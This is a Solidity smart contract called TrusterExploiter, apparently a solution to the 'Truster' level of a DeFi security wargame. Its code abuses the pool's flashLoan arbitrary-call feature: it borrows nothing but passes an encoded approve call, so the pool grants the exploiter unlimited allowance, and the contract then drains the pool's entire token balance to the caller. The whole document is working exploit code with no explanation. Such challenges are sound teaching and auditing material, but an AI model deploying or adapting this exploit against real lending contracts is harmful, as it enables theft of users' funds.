pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterExploiter {

    using Address for address;

    constructor() {}

    function runExploit(address _lenderAddress, address _tokenAddress) external {
        _lenderAddress.functionCall(abi.encodeWithSignature(
                                        "flashLoan(uint256,address,address,bytes)",
                                        0,
                                        address(this),
                                        _tokenAddress,
                                        getAbi())
                                    ); // approval

        IERC20 token = IERC20(_tokenAddress);
        token.transferFrom(_lenderAddress,address(this),token.balanceOf(_lenderAddress));
        token.transfer(msg.sender,token.balanceOf(address(this)));
    }

    // @dev returns the bytes data required for calling in the pool contract
    function getAbi() public view returns (bytes memory data) {
        data = abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    type(uint256).max
                );
    }
}